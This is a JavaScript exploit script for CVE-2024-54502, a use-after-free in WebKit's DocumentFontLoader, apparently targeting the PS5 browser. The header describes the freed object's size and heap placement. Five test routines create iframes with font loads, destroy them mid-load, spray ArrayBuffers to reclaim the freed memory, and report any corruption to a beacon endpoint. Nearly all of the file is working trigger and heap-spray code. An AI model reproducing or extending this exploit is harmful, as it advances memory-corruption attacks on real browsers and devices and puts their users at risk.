// p211 — CVE-2024-54502 DocumentFontLoader UAF with real fonts
//
// Source-verified attack path (DocumentFontLoader.cpp:95-107):
//   fontLoadingTimerFired() calls loadPendingFonts() which calls
//   beginLoadIfNeeded() (completes sync for CACHED fonts), then
//   decrementRequestCount(). After loop: loadDone() + checkLoadComplete().
//   If loadDone releases last Document ref → Document freed →
//   DocumentFontLoader freed → but fontLoadingTimerFired() continues
//   accessing m_document on lines 101 and 105 → UAF
//
// Key: TWO iframes with SAME font URL. First caches font.
// Second triggers sync cached path where beginLoadIfNeeded()
// completes immediately.
//
// DocumentFontLoader is WTF_MAKE_FAST_ALLOCATED (fastMalloc heap).
// sizeof ≈ 82-114 bytes (Document& + Timer + Vector + 2 bools).
// Same heap as ArrayBuffer backing stores (Gigacage DISABLED on PS5).
//
// Uses real .ttf files (f0-f9.ttf) served from same host.
//
// Beacon prefix: V211-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V211-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var FONTS = ['f0.ttf', 'f1.ttf', 'f2.ttf', 'f3.ttf', 'f4.ttf',
               'f5.ttf', 'f7.ttf', 'f8.ttf', 'f9.ttf'];
  var SPRAY_SIZES = [64, 80, 96, 112, 128];
  var SPRAY_PER = 3000;
  var MARKER = 0xBAADF00D;

  var tests = [];
  var currentTest = 0;

  function makeSpray(round) {
    var spray = {};
    for (var s = 0; s < SPRAY_SIZES.length; s++) {
      var sz = SPRAY_SIZES[s];
      var arr = [];
      for (var i = 0; i < SPRAY_PER; i++) {
        var ab = new ArrayBuffer(sz);
        var dv = new DataView(ab);
        dv.setUint32(0, MARKER, true);
        dv.setUint32(4, sz, true);
        dv.setUint32(8, i, true);
        if (sz >= 16) dv.setUint32(12, round, true);
        arr.push(ab);
      }
      spray[sz] = arr;
    }
    return spray;
  }

  function checkSpray(spray) {
    var corrupt = 0;
    var detail = '';
    for (var sz in spray) {
      var arr = spray[sz];
      for (var i = 0; i < arr.length; i++) {
        try {
          var dv = new DataView(arr[i]);
          if (dv.getUint32(0, true) !== MARKER) {
            corrupt++;
            if (!detail) {
              var u8 = new Uint8Array(arr[i]);
              var hex = '';
              for (var j = 0; j < 32 && j < u8.length; j++) {
                hex += ('0' + u8[j].toString(16)).slice(-2);
              }
              detail = 'SZ' + sz + '-I' + i + '-' + hex;
            }
          }
        } catch (e) {
          corrupt++;
          if (!detail) detail = 'SZ' + sz + '-ERR';
        }
      }
    }
    return {count: corrupt, detail: detail};
  }

  // ── TEST A: Two-iframe cached font pattern (exact CVE regression) ──
  // First iframe loads font (caches it). Second iframe uses same font
  // and self-removes during load → fontLoadingTimerFired on freed doc.
  tests.push({name: 'A-TWOFR', run: function(done) {
    var fontUrl = FONTS[0];
    B('A-FONT-' + fontUrl);

    // Step 1: Create first iframe to cache the font
    var ifr1 = document.createElement('iframe');
    ifr1.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(ifr1);
    var doc1 = ifr1.contentDocument;
    var style1 = doc1.createElement('style');
    style1.textContent = '@font-face { font-family: "TrigA"; src: url("' + fontUrl + '"); } body { font-family: "TrigA", serif; }';
    doc1.head.appendChild(style1);
    var div1 = doc1.createElement('div');
    div1.textContent = 'ABCDEFGHIJ 0123456789 abcdefghij';
    doc1.body.appendChild(div1);
    var _ = div1.offsetHeight; // trigger layout + font load
    B('A-IFR1-LAID-OUT');

    // Wait for font to cache
    setTimeout(function() {
      B('A-CACHED');

      // Run multiple rounds of iframe2 creation + destruction
      var rounds = 30;
      var r = 0;

      function nextRound() {
        if (r >= rounds) {
          B('A-ROUNDS-DONE');
          ifr1.remove();
          done();
          return;
        }

        // Step 2: Second iframe with same font, self-removes
        var ifr2 = document.createElement('iframe');
        ifr2.style.cssText = 'width:1px;height:1px;position:absolute;left:-9998px;';
        document.body.appendChild(ifr2);
        var doc2 = ifr2.contentDocument;

        // Apply CSS font to trigger DocumentFontLoader
        var style2 = doc2.createElement('style');
        style2.textContent = '@font-face { font-family: "TrigA"; src: url("' + fontUrl + '"); } body { font-family: "TrigA", serif; }';
        doc2.head.appendChild(style2);
        var div2 = doc2.createElement('div');
        div2.textContent = 'TRIGGER TEXT ROUND ' + r;
        doc2.body.appendChild(div2);
        var __ = div2.offsetHeight; // force layout → beginLoadingFontSoon

        // Remove iframe IMMEDIATELY while fontLoadingTimer is pending (0ms timer)
        ifr2.remove();

        // Spray to reclaim freed DocumentFontLoader
        var spray = makeSpray(r);

        // Check after timer would have fired
        setTimeout(function() {
          var result = checkSpray(spray);
          if (result.count > 0) {
            B('A-CORRUPT-R' + r + '-N' + result.count);
            B('A-HEX-' + result.detail);
          }
          spray = null;
          r++;
          nextRound();
        }, 50);
      }

      nextRound();
    }, 1000);
  }});

  // ── TEST B: Bulk iframe create-destroy with font loading ──
  // Create many iframes simultaneously with font CSS, destroy all at once
  tests.push({name: 'B-BULK', run: function(done) {
    var N = 20;
    var iframes = [];
    var fontUrl = FONTS[1];

    // Create N iframes all loading the same font
    for (var i = 0; i < N; i++) {
      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ifr);
      var doc = ifr.contentDocument;
      var style = doc.createElement('style');
      style.textContent = '@font-face { font-family: "BulkFont"; src: url("' + fontUrl + '?b=' + i + '"); } body { font-family: "BulkFont"; }';
      doc.head.appendChild(style);
      var div = doc.createElement('div');
      div.textContent = 'Bulk iframe ' + i;
      doc.body.appendChild(div);
      var _ = div.offsetHeight;
      iframes.push(ifr);
    }
    B('B-CREATED-' + N);

    // Remove ALL iframes at once
    for (var j = 0; j < iframes.length; j++) {
      iframes[j].remove();
    }
    iframes = null;
    B('B-REMOVED-ALL');

    // GC pressure + spray
    for (var g = 0; g < 50000; g++) new ArrayBuffer(96);
    B('B-GC');

    var spray = makeSpray(99);
    B('B-SPRAYED');

    setTimeout(function() {
      var result = checkSpray(spray);
      if (result.count > 0) {
        B('B-CORRUPT-N' + result.count);
        B('B-HEX-' + result.detail);
      } else {
        B('B-CLEAN');
      }
      spray = null;
      done();
    }, 500);
  }});

  // ── TEST C: FontFace JS API + iframe destroy ──
  // Use FontFace API to load in iframe, destroy iframe during load callback
  tests.push({name: 'C-JSAPI', run: function(done) {
    var rounds = 20;
    var r = 0;

    function nextC() {
      if (r >= rounds) { B('C-DONE-' + rounds); done(); return; }

      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ifr);
      var doc = ifr.contentDocument;

      // Use FontFace API in iframe
      try {
        var face = new FontFace('JSFont', 'url(' + FONTS[r % FONTS.length] + '?c=' + r + ')');
        doc.fonts.add(face);
        face.load();
      } catch (e) {
        B('C-SETUP-ERR-' + r);
      }

      // Destroy immediately
      ifr.remove();

      // Spray
      var spray = makeSpray(r);

      setTimeout(function() {
        var result = checkSpray(spray);
        if (result.count > 0) {
          B('C-CORRUPT-R' + r + '-N' + result.count);
          B('C-HEX-' + result.detail);
        }
        spray = null;
        r++;
        nextC();
      }, 100);
    }

    nextC();
  }});

  // ── TEST D: Rapid iframe with srcdoc font loading ──
  // Use srcdoc which inlines the font CSS — different parsing path
  tests.push({name: 'D-SRCDOC', run: function(done) {
    var rounds = 20;
    var r = 0;

    function nextD() {
      if (r >= rounds) { B('D-DONE-' + rounds); done(); return; }

      var fontUrl = FONTS[r % FONTS.length];
      var ifr = document.createElement('iframe');
      ifr.srcdoc = '<!doctype html><html><head><style>@font-face{font-family:"SrcFont";src:url("' + fontUrl + '?d=' + r + '")} body{font-family:"SrcFont"}</style></head><body><div>SRCDOC ' + r + '</div></body></html>';
      document.body.appendChild(ifr);

      // Give srcdoc a moment to parse, then destroy
      setTimeout(function() {
        ifr.remove();

        // GC + spray
        for (var g = 0; g < 10000; g++) new ArrayBuffer(96);
        var spray = makeSpray(r);

        setTimeout(function() {
          var result = checkSpray(spray);
          if (result.count > 0) {
            B('D-CORRUPT-R' + r + '-N' + result.count);
            B('D-HEX-' + result.detail);
          }
          spray = null;
          r++;
          nextD();
        }, 100);
      }, 10);
    }

    nextD();
  }});

  // ── TEST E: CSS @import font in iframe ──
  // Different code path: CSS parser triggers font load via @import
  tests.push({name: 'E-IMPORT', run: function(done) {
    var rounds = 15;
    var r = 0;

    function nextE() {
      if (r >= rounds) { B('E-DONE-' + rounds); done(); return; }

      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ifr);
      var doc = ifr.contentDocument;

      // Create multiple font faces to stress the DocumentFontLoader
      for (var i = 0; i < 5; i++) {
        var style = doc.createElement('style');
        style.textContent = '@font-face { font-family: "Imp' + i + '"; src: url("' + FONTS[(r * 5 + i) % FONTS.length] + '?e=' + r + '_' + i + '"); } .c' + i + ' { font-family: "Imp' + i + '"; }';
        doc.head.appendChild(style);
        var div = doc.createElement('div');
        div.className = 'c' + i;
        div.textContent = 'Font ' + i + ' round ' + r;
        doc.body.appendChild(div);
      }
      var _ = doc.body.offsetHeight;

      // Destroy while 5 fonts are pending
      ifr.remove();

      // Heavy spray at DocumentFontLoader size class
      var spray = makeSpray(r);

      setTimeout(function() {
        var result = checkSpray(spray);
        if (result.count > 0) {
          B('E-CORRUPT-R' + r + '-N' + result.count);
          B('E-HEX-' + result.detail);
        }
        spray = null;
        r++;
        nextE();
      }, 100);
    }

    nextE();
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 30000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
